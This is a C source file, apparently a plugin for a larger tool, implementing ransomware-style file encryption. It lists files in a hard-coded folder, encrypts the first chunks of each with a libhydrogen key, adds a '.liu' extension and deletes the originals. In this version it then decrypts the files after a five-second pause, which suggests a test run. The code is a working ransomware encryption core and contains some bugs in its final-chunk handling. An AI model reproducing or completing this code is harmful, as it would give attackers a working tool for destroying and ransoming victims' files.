#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <unistd.h>

#include "types.h"
#include "system_utils.h"
#include "hydrogen.h"

/**
 * Encrypts a file
 *
 * Given a file name and a place to save the key,
 * it encrypts some bytes at the start of the file
 * and then returns saving the encryption (and 
 * decryption) key inside 'key'
 *
 * Returns - OK or ERROR
*/
int encrypt_file(char *file_name, uint8_t *key);

/**
 * Decrypts a file
 *
 * Given a file name and a key, it removes the .liu
 * extension from the file and saves the decrypted
 * content.
 *
 * Returns - OK or ERROR
*/
int decrypt_file(char *file_name, uint8_t *key);

#define TESTING_FOLDER "/home/solanav/back/"
#define MAX_NAME 255
#define N_FILE_NAME_LEN strlen(file_name) + strlen(FILE_EXTENSION) + 1
#define META_SIZE 512
#define BUF_SIZE 1024
#define CHUNKS_TO_ENCRYPT 10
#define FILE_EXTENSION ".liu"
#define CONTEXT "FENCRYPT"
#define ENCRYPTED_BUF_SIZE BUF_SIZE + hydro_secretbox_HEADERBYTES

int init_plugin()
{
	int file_num = 0;
	char *full_path = (char *)calloc(MAX_NAME + 1, sizeof(char));

	// Get list of unencrypted files
	char **list = list_files(TESTING_FOLDER, &file_num);
	if (!list)
		return ERROR;

	// Generate encryption key
	uint8_t key[hydro_secretbox_KEYBYTES];
	hydro_secretbox_keygen(key);

	// Encrypt files
	for (int i = 0; i < file_num; i++)
	{
		full_path = strncat(full_path, TESTING_FOLDER, MAX_NAME - strlen(full_path));
		full_path = strncat(full_path, list[i], MAX_NAME - strlen(full_path));
		encrypt_file(full_path, key);
		memset(full_path, 0, MAX_NAME * sizeof(char));
	}

	sleep(5);

	// Free old list
	free_list_files(list, file_num);
	
	// Get new list
	list = list_files(TESTING_FOLDER, &file_num);
	if (!list)
		return ERROR;

	for (int i = 0; i < file_num; i++)
	{
		full_path = strncat(full_path, TESTING_FOLDER, MAX_NAME - strlen(full_path));
		full_path = strncat(full_path, list[i], MAX_NAME - strlen(full_path));
		if (decrypt_file(full_path, key) == ERROR) {
			DEBUG_PRINT((P_ERROR"Failed to decrypt file %s\n", full_path));
		}
		memset(full_path, 0, MAX_NAME * sizeof(char));
	}

	// Free list
	free_list_files(list, file_num);

	free(full_path);

	return OK;
}

int encrypt_file(char *file_name, uint8_t *key)
{
    FILE *fp_original, *fp_encrypted;
    char *n_file_name = (char *)calloc(N_FILE_NAME_LEN + 1, sizeof(char));
    char buf[BUF_SIZE] = {0};
    uint8_t encrypted_buf[ENCRYPTED_BUF_SIZE];

    // Open original file
    fp_original = fopen(file_name, "rb");
    if (!fp_original)
    {
        DEBUG_PRINT((P_ERROR "Could not read the file [%s]\n", file_name););
        free(n_file_name);
        return ERROR;
    }

    // Open .liu file to write encrypted data
    strncpy(n_file_name, file_name, N_FILE_NAME_LEN);
    strncat(n_file_name, FILE_EXTENSION, N_FILE_NAME_LEN);
    fp_encrypted = fopen(n_file_name, "wb");
    if (!fp_encrypted)
    {
        DEBUG_PRINT((P_ERROR "Could not open .liu file\n"););
        fclose(fp_original);
        free(n_file_name);
        return ERROR;
    }

    // Read the metadata and write it unencrypted
    int meta_written = fread(buf, 1, META_SIZE, fp_original);
    fwrite(buf, meta_written, 1, fp_encrypted);

    long last_pos = meta_written;
    long i = 0;
    int encrypted_flag = 0;
    // Read to buf until nothing is left
    while (fread(buf, BUF_SIZE, 1, fp_original))
    {
        if (i < CHUNKS_TO_ENCRYPT)
        {
            // Write encrypted data
            hydro_secretbox_encrypt(encrypted_buf, buf, BUF_SIZE, 0, CONTEXT, key);

            fwrite(encrypted_buf, ENCRYPTED_BUF_SIZE, 1, fp_encrypted);

            if (i == CHUNKS_TO_ENCRYPT - 1)
                encrypted_flag = 1;
        }
        else
        {
            // Write original data
            fwrite(buf, BUF_SIZE, 1, fp_encrypted);
        }

        last_pos = ftell(fp_original);
        i++;
    }

    long last_chunk_len = ftell(fp_original) - last_pos;
    fseek(fp_original, last_pos, SEEK_SET);

    // Read last chunk of data
    if (last_chunk_len > 0 && encrypted_flag == 0)
    {
        // Encrypt it and write it
        hydro_secretbox_encrypt(encrypted_buf, buf, last_chunk_len, 0, CONTEXT, key);
        fwrite(encrypted_buf, last_chunk_len + hydro_secretbox_HEADERBYTES, 1, fp_encrypted);
    }
    else if (last_chunk_len > 0)
    {
        // Just write the original
        fwrite(buf, last_chunk_len, 1, fp_encrypted);
    }

    // Clean everything
    fclose(fp_original);
    fclose(fp_encrypted);
    free(n_file_name);

    // Remove original file
    remove(file_name);

    DEBUG_PRINT((P_OK "Encrypted file [%s]\n", file_name););
    return OK;

}

int decrypt_file(char *file_name, uint8_t *key)
{
    FILE *fp_encrypted, *fp_decrypted;
    char *n_file_name = (char *)calloc(strlen(file_name) - strlen(FILE_EXTENSION) + 1, sizeof(char));
    char buf[ENCRYPTED_BUF_SIZE] = {0};
    char decrypted_buf[BUF_SIZE] = {0};

    // Check the file is .liu
    char *file_extension = file_name + (strlen(file_name) - strlen(FILE_EXTENSION));
    if (strncmp(file_extension, FILE_EXTENSION, strlen(FILE_EXTENSION)) != 0)
    {
        DEBUG_PRINT((P_WARN "The extension of that file is not .liu\n"););
        return ERROR;
    }

    // Open .liu file
    fp_encrypted = fopen(file_name, "rb");
    if (!fp_encrypted)
    {
        DEBUG_PRINT((P_ERROR "Could not read .liu file [%s]...\n", file_name););
        free(n_file_name);
        return ERROR;
    }

    // Open new file to decrypt
    strncpy(n_file_name, file_name, strlen(file_name) - strlen(FILE_EXTENSION));
    fp_decrypted = fopen(n_file_name, "wb");
    if (!fp_decrypted)
    {
        DEBUG_PRINT((P_ERROR "Could not open decrypted file\n"););
        fclose(fp_encrypted);
        free(n_file_name);
        return ERROR;
    }

    // Read the metadata and write it unencrypted
    int meta_written = fread(buf, 1, META_SIZE, fp_encrypted);
    fwrite(buf, meta_written, 1, fp_decrypted);

    long last_pos = meta_written;
    long i = 0;
    int decrypted_flag = 0;
    // Read to buf until nothing is left
    while (fread(buf, ENCRYPTED_BUF_SIZE, 1, fp_encrypted))
    {
        if (i < CHUNKS_TO_ENCRYPT)
        {
            // Write decrypted data
            if (hydro_secretbox_decrypt(decrypted_buf, (uint8_t *)buf, ENCRYPTED_BUF_SIZE, 0, CONTEXT, key) != 0)
            {
                DEBUG_PRINT((P_ERROR "Decrypting chunk failed\n"););
                return ERROR;
            }

            fwrite(decrypted_buf, BUF_SIZE, 1, fp_decrypted);

            if (i == CHUNKS_TO_ENCRYPT - 1)
                decrypted_flag = 1;
        }
        else
        {
            // Write original data
            fwrite(buf, ENCRYPTED_BUF_SIZE, 1, fp_decrypted);
        }

        last_pos = ftell(fp_encrypted);
        i++;
    }

    long last_chunk_len = ftell(fp_encrypted) - last_pos;

    // Read last chunk of data
    if (last_chunk_len > 0 && decrypted_flag == 0)
    {
        // Decrypt it and write it
        if (hydro_secretbox_decrypt(decrypted_buf, (uint8_t *)buf, last_chunk_len, 0, CONTEXT, key) != 0)
        {
            DEBUG_PRINT((P_ERROR "Decrypting final chunk failed\n"););
            return ERROR;
        }

        fwrite(decrypted_buf, last_chunk_len - hydro_secretbox_HEADERBYTES, 1, fp_decrypted);
    }
    else if (last_chunk_len > 0)
    {
        // Just write the original
        fwrite(buf, last_chunk_len, 1, fp_decrypted);
    }

    // Clean everything
    fclose(fp_encrypted);
    fclose(fp_decrypted);
    free(n_file_name);

    // Remove original file
    remove(file_name);

    DEBUG_PRINT((P_OK "Decrypted file [%s]\n", file_name););

    return OK;
}